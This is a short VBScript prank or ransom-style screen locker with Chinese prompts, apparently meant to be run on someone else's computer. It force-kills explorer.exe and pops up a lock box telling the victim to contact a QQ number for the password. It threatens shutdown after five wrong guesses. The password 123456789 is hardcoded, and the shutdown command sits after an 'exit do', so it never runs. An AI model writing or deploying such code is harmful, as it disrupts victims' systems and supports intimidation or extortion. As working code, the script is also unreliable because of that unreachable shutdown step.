dim mima,suoping,ctr
ctr=0
set suoping=createobject("wscript.shell")
suoping.run "taskkill /im explorer /f"
do
mima=inputbox("你被锁屏了！密码联系QQ：XXXXXXXXXX"+ chr(13) +"若错了5次以上则关机","锁屏")
if mima="123456789" then
msgbox"被你破密码了！"
exit do
else
if ctr=5 then
msgbox"886"
exit do
suoping.run "cmd /c shutdown -s -t 0"
else
ctr=ctr+1
msgbox"错啦！！"
end if
end if 
loop


